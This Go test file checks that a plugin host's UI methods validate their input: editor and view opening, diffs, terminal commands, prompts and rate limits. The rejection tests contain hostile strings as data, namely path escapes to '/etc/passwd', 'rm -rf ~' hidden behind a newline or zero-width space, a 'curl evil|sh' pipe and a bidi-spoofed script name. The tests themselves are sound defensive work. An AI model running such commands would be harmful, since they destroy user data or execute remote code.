package plugin

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"
)

type capturedUIEvents struct {
	mu     sync.Mutex
	events []struct {
		name string
		data any
	}
}

func captureHostUI(t *testing.T) *capturedUIEvents {
	t.Helper()
	captured := &capturedUIEvents{}
	previousEmit, previousLimiter, previousTarget := hostUIEmit, hostUILimiter, viewOpenTarget
	hostUIEmit = func(name string, data any) {
		captured.mu.Lock()
		defer captured.mu.Unlock()
		captured.events = append(captured.events, struct {
			name string
			data any
		}{name, data})
	}
	hostUILimiter = newHostRateLimiter(hostUIRequestsPerMinute, time.Minute)
	viewOpenTarget = func(pluginID, viewID string) error {
		if pluginID == "notes" && viewID == "main" || pluginID == "report" && viewID == "main" {
			return nil
		}
		return errors.New("no such view")
	}
	t.Cleanup(func() { hostUIEmit, hostUILimiter, viewOpenTarget = previousEmit, previousLimiter, previousTarget })
	return captured
}

func (c *capturedUIEvents) last(t *testing.T, name string) any {
	t.Helper()
	c.mu.Lock()
	defer c.mu.Unlock()
	for i := len(c.events) - 1; i >= 0; i-- {
		if c.events[i].name == name {
			return c.events[i].data
		}
	}
	t.Fatalf("no %s event in %+v", name, c.events)
	return nil
}

func uiRuntime(id string) *processRuntime {
	return &processRuntime{pluginID: id, manifest: Manifest{Name: "Notes\u0007 Plugin"}}
}

func uiCall(handler hostMethodHandler, runtimeHost *processRuntime, params string) (any, *rpcError) {
	return handler(runtimeHost, json.RawMessage(params))
}

func TestHostEditorOpenStaysInsideTheWorkspace(t *testing.T) {
	events := captureHostUI(t)
	root := useWorkspaceRoot(t)
	writeWorkspaceFile(t, root, "src/main.go", "package main\n")
	writeWorkspaceFile(t, root, ".env", "TOKEN=x\n")
	runtimeHost := uiRuntime("notes")
	if _, err := uiCall(hostEditorOpen, runtimeHost, `{"path":"src/main.go","line":3,"column":2}`); err != nil {
		t.Fatal(err)
	}
	got := events.last(t, pluginEditorOpenEvent).(editorOpenEvent)
	if got.Root != root || got.Path != "src/main.go" || got.Line != 3 || got.Column != 2 || got.PluginID != "notes" || got.PluginName != "Notes Plugin" {
		t.Fatalf("event %+v", got)
	}
	for name, params := range map[string]string{
		"escape":        `{"path":"../outside.txt"}`,
		"absolute":      `{"path":"/etc/passwd"}`,
		"directory":     `{"path":"src"}`,
		"missing":       `{"path":"src/none.go"}`,
		"root":          `{"path":""}`,
		"column only":   `{"path":"src/main.go","column":4}`,
		"negative line": `{"path":"src/main.go","line":-1}`,
		"unknown field": `{"path":"src/main.go","select":true}`,
	} {
		if _, err := uiCall(hostEditorOpen, runtimeHost, params); err == nil {
			t.Fatalf("%s accepted", name)
		}
	}
}

func TestHostViewOpenValidatesTargetsAndParams(t *testing.T) {
	events := captureHostUI(t)
	runtimeHost := uiRuntime("notes")
	if _, err := uiCall(hostViewOpen, runtimeHost, `{"viewId":"main"}`); err != nil {
		t.Fatal(err)
	}
	if got := events.last(t, pluginViewOpenEvent).(viewOpenEvent); got.TargetPluginID != "notes" || got.Entry != "" || got.Params != nil {
		t.Fatalf("own view %+v", got)
	}
	if _, err := uiCall(hostViewOpen, runtimeHost, `{"pluginId":"report","viewId":"main","entry":"draft","params":{"week":"2026-40","pinned":true,"n":3}}`); err != nil {
		t.Fatal(err)
	}
	got := events.last(t, pluginViewOpenEvent).(viewOpenEvent)
	if got.PluginID != "notes" || got.TargetPluginID != "report" || got.Entry != "draft" || got.Params["week"] != "2026-40" || got.Params["pinned"] != true {
		t.Fatalf("cross-plugin view %+v", got)
	}
	for name, params := range map[string]string{
		"unknown view":    `{"viewId":"settings"}`,
		"unknown plugin":  `{"pluginId":"ghost","viewId":"main"}`,
		"bad view id":     `{"viewId":"../main"}`,
		"params no entry": `{"viewId":"main","params":{"a":"b"}}`,
		"object param":    `{"viewId":"main","entry":"x","params":{"a":{"b":1}}}`,
		"long param":      `{"viewId":"main","entry":"x","params":{"a":"` + strings.Repeat("x", 1025) + `"}}`,
	} {
		if _, err := uiCall(hostViewOpen, runtimeHost, params); err == nil {
			t.Fatalf("%s accepted", name)
		}
	}
}

func TestHostDiffOpenBoundsContent(t *testing.T) {
	events := captureHostUI(t)
	runtimeHost := uiRuntime("notes")
	if _, err := uiCall(hostDiffOpen, runtimeHost, `{"title":"config.yaml","language":"yaml","left":{"title":"server","content":"a: 1\n"},"right":{"title":"local","content":"a: 2\n"}}`); err != nil {
		t.Fatal(err)
	}
	if got := events.last(t, pluginDiffOpenEvent).(diffOpenEvent); got.Left.Content != "a: 1\n" || got.Right.Title != "local" || got.Language != "yaml" {
		t.Fatalf("event %+v", got)
	}
	big := strings.Repeat("x", hostDiffSideMaxBytes+1)
	for name, params := range map[string]string{
		"no title":     `{"left":{"content":""},"right":{"content":""}}`,
		"bad language": `{"title":"x","language":"a b","left":{"content":""},"right":{"content":""}}`,
		"too large":    `{"title":"x","left":{"content":"` + big + `"},"right":{"content":""}}`,
	} {
		if _, err := uiCall(hostDiffOpen, runtimeHost, params); err == nil {
			t.Fatalf("%s accepted", name)
		}
	}
}

func TestHostTerminalOpenResolvesCwdAndSingleLineCommands(t *testing.T) {
	events := captureHostUI(t)
	root := useWorkspaceRoot(t)
	writeWorkspaceFile(t, root, "web/package.json", "{}")
	runtimeHost := uiRuntime("notes")
	if _, err := uiCall(hostTerminalOpen, runtimeHost, `{"title":"dev","cwd":"web","command":"npm run dev"}`); err != nil {
		t.Fatal(err)
	}
	got := events.last(t, pluginTerminalOpenEvent).(terminalOpenEvent)
	if !strings.HasSuffix(got.Cwd, "web") || got.Command != "npm run dev" || got.Title != "dev" {
		t.Fatalf("event %+v", got)
	}
	for name, params := range map[string]string{
		"multi-line":    `{"command":"ls\nrm -rf ~"}`,
		"control chars": `{"command":"#curl -s evil|sh\u0001\u0004"}`,
		"ansi escape":   `{"command":"echo \u001b[2K"}`,
		"bidi":          `{"command":"echo safe \u202e hs.lave"}`,
		"zero width":    `{"command":"rm\u200b -rf ~"}`,
		"escape":        `{"cwd":"../"}`,
		"file cwd":      `{"cwd":"web/package.json"}`,
	} {
		if _, err := uiCall(hostTerminalOpen, runtimeHost, params); err == nil {
			t.Fatalf("%s accepted", name)
		}
	}
}

func TestHostUIRequestsAreRateLimitedPerPlugin(t *testing.T) {
	captureHostUI(t)
	hostUILimiter = newHostRateLimiter(2, time.Minute)
	runtimeHost := uiRuntime("notes")
	for i := 0; i < 2; i++ {
		if _, err := uiCall(hostViewOpen, runtimeHost, `{"viewId":"main"}`); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := uiCall(hostViewOpen, runtimeHost, `{"viewId":"main"}`); err == nil || err.Code != -32005 {
		t.Fatalf("third request: %v", err)
	}
	if _, err := uiCall(hostViewOpen, uiRuntime("report"), `{"viewId":"main"}`); err != nil {
		t.Fatalf("other plugin limited: %v", err)
	}
}

// answerNext waits for the next prompt event and replies to it.
func answerNext(t *testing.T, events *capturedUIEvents, reply func(event promptEvent) promptReply) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		events.mu.Lock()
		var found *promptEvent
		for i := len(events.events) - 1; i >= 0; i-- {
			if events.events[i].name == pluginPromptEvent {
				event := events.events[i].data.(promptEvent)
				found = &event
				events.events = append(events.events[:i], events.events[i+1:]...)
				break
			}
		}
		events.mu.Unlock()
		if found != nil {
			raw, _ := json.Marshal(map[string]any{"id": found.ID, "reply": reply(*found)})
			if _, err := pluginHostPromptReplyHandler("", string(raw)); err != nil {
				t.Errorf("reply: %v", err)
			}
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Error("no prompt event")
}

func TestHostQuickPickAndInputBoxRoundTrip(t *testing.T) {
	events := captureHostUI(t)
	runtimeHost := uiRuntime("notes")
	go answerNext(t, events, func(event promptEvent) promptReply {
		if event.Kind != "quickPick" || len(event.Items) != 2 || event.PluginName != "Notes Plugin" {
			t.Errorf("event %+v", event)
		}
		return promptReply{IDs: []string{"prod"}}
	})
	result, err := uiCall(hostQuickPick, runtimeHost, `{"title":"Profile","items":[{"id":"dev","label":"Dev"},{"id":"prod","label":"Prod","detail":"careful"}]}`)
	if err != nil {
		t.Fatal(err)
	}
	if got := result.(map[string]any); got["cancelled"] != false || got["ids"].([]string)[0] != "prod" {
		t.Fatalf("result %+v", got)
	}
	value := "v1.2"
	go answerNext(t, events, func(promptEvent) promptReply { return promptReply{Value: &value} })
	result, err = uiCall(hostInputBox, runtimeHost, `{"title":"Tag","value":"v1.1"}`)
	if err != nil || result.(map[string]any)["value"] != "v1.2" {
		t.Fatalf("%v %v", result, err)
	}
	go answerNext(t, events, func(promptEvent) promptReply { return promptReply{Cancelled: true} })
	result, err = uiCall(hostInputBox, runtimeHost, `{"title":"Tag"}`)
	if err != nil || result.(map[string]any)["cancelled"] != true {
		t.Fatalf("%v %v", result, err)
	}
	for name, params := range map[string]string{
		"no items":    `{"items":[]}`,
		"dup ids":     `{"items":[{"id":"a","label":"A"},{"id":"a","label":"B"}]}`,
		"empty label": `{"items":[{"id":"a","label":"  "}]}`,
		"input title": `{"title":""}`,
		"input value": `{"title":"x","value":"a\nb"}`,
		"input short": `{"title":"x","timeoutMs":1000}`,
		"input long":  `{"title":"x","timeoutMs":600000}`,
	} {
		handler := hostQuickPick
		if strings.HasPrefix(name, "input") {
			handler = hostInputBox
		}
		if _, err := uiCall(handler, runtimeHost, params); err == nil {
			t.Fatalf("%s accepted", name)
		}
	}
}

func TestPromptBrokerRejectsBadRepliesAndStopsWithThePlugin(t *testing.T) {
	events := captureHostUI(t)
	broker := &promptBroker{pending: map[string]*pendingPrompt{}, byPlugin: map[string]string{}}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan promptReply, 1)
	go func() {
		reply, _ := broker.ask(ctx, promptEvent{Kind: "quickPick"}, &pendingPrompt{pluginID: "notes", kind: "quickPick", items: map[string]bool{"a": true}}, time.Minute)
		done <- reply
	}()
	var id string
	for id == "" {
		broker.mu.Lock()
		id = broker.byPlugin["notes"]
		broker.mu.Unlock()
		time.Sleep(time.Millisecond)
	}
	// A second prompt from the same plugin is refused while one is open.
	if _, err := broker.ask(context.Background(), promptEvent{}, &pendingPrompt{pluginID: "notes"}, time.Minute); err == nil {
		t.Fatal("concurrent prompt accepted")
	}
	value := "x"
	for _, bad := range []promptReply{{IDs: []string{"zz"}}, {IDs: []string{"a", "a"}}, {Value: &value}, {}} {
		if err := broker.answer(id, bad); err == nil {
			t.Fatalf("bad reply accepted: %+v", bad)
		}
	}
	cancel()
	if reply := <-done; !reply.Cancelled {
		t.Fatalf("reply %+v", reply)
	}
	events.last(t, pluginPromptCancelEvent)
	if err := broker.answer(id, promptReply{IDs: []string{"a"}}); err == nil {
		t.Fatal("answer after close accepted")
	}
}

func TestPromptTimeoutClosesThePrompt(t *testing.T) {
	events := captureHostUI(t)
	broker := &promptBroker{pending: map[string]*pendingPrompt{}, byPlugin: map[string]string{}}
	reply, err := broker.ask(context.Background(), promptEvent{Kind: "inputBox"}, &pendingPrompt{pluginID: "notes", kind: "inputBox"}, 20*time.Millisecond)
	if err != nil || !reply.Cancelled {
		t.Fatalf("%+v %v", reply, err)
	}
	events.last(t, pluginPromptCancelEvent)
	if d, err := promptTimeout(0); err != nil || d != hostPromptDefaultTimeout {
		t.Fatalf("default timeout %v %v", d, err)
	}
	if d, err := promptTimeout(120000); err != nil || d != 2*time.Minute {
		t.Fatalf("custom timeout %v %v", d, err)
	}
}

func TestHostEditorOpenNamesTheAnnouncedRoot(t *testing.T) {
	events := captureHostUI(t)
	root := useWorkspaceRoot(t)
	writeWorkspaceFile(t, root, "a.txt", "x")
	previous := pluginWorkspaceRootInput
	pluginWorkspaceRootInput = func() string { return "/tmp/linked-project" }
	t.Cleanup(func() { pluginWorkspaceRootInput = previous })
	if _, err := uiCall(hostEditorOpen, uiRuntime("notes"), `{"path":"a.txt"}`); err != nil {
		t.Fatal(err)
	}
	if got := events.last(t, pluginEditorOpenEvent).(editorOpenEvent); got.Root != "/tmp/linked-project" || got.Path != "a.txt" {
		t.Fatalf("event %+v", got)
	}
}
